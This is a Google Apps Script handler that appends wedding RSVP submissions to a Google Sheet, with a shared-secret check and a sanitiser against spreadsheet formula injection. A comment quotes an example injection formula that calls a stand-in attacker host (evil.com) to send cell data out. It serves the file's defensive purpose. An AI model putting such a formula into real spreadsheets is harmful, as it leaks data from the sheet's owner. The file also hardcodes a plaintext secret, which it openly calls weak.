/**
 * Google Apps Script Web App — receives RSVP submissions from the wedding
 * site and appends them as rows to the Google Sheet this script is bound to.
 *
 * Setup instructions: see SETUP.md in this same folder. This file only runs
 * inside Google Apps Script (script.google.com) — it is not loaded by the
 * static site directly.
 */

// Must match WEDDING_CONTENT.integrations.rsvpSecret in js/content.js.
// This is a spam deterrent, not real security — see SETUP.md's security note.
const SHARED_SECRET = 'SEe48vQzOm2kdo7fKxpEEqhW';

const HEADERS = ['Timestamp', 'Guest ID', 'Name', 'Attending', 'Guest Count', 'Arrival Plan', 'Phone', 'Message'];

function doPost(e) {
  try {
    const data = JSON.parse(e.postData.contents);

    if (data.secret !== SHARED_SECRET) {
      return respond({ success: false, error: 'Unauthorized' });
    }
    if (!data.name || typeof data.attending === 'undefined') {
      return respond({ success: false, error: 'Missing required fields' });
    }

    const sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
    ensureHeaderRow(sheet);

    sheet.appendRow([
      new Date(),
      sanitizeForSheet(data.guestId || ''),
      sanitizeForSheet(data.name),
      data.attending ? 'Yes' : 'No',
      data.attending ? data.guests || 1 : '',
      sanitizeForSheet(data.arrivalPlan || ''),
      sanitizeForSheet(data.phone || ''),
      sanitizeForSheet(data.message || ''),
    ]);

    return respond({ success: true });
  } catch (err) {
    return respond({ success: false, error: err.message });
  }
}

function ensureHeaderRow(sheet) {
  if (sheet.getLastRow() === 0) {
    sheet.appendRow(HEADERS);
    sheet.getRange(1, 1, 1, HEADERS.length).setFontWeight('bold');
  }
}

/**
 * Neutralizes spreadsheet formula injection. Any text starting with a
 * character Sheets treats as a formula trigger (=, +, -, @) gets a leading
 * apostrophe, which forces Sheets to render it as plain text instead of
 * evaluating it — otherwise a submitted Name/Message like
 * =IMPORTXML("http://evil.com/?"&A1) could run as a live formula the
 * moment the sheet owner opens the file.
 */
function sanitizeForSheet(value) {
  const str = String(value);
  return /^[=+\-@]/.test(str) ? `'${str}` : str;
}

function respond(obj) {
  return ContentService.createTextOutput(JSON.stringify(obj)).setMimeType(ContentService.MimeType.JSON);
}
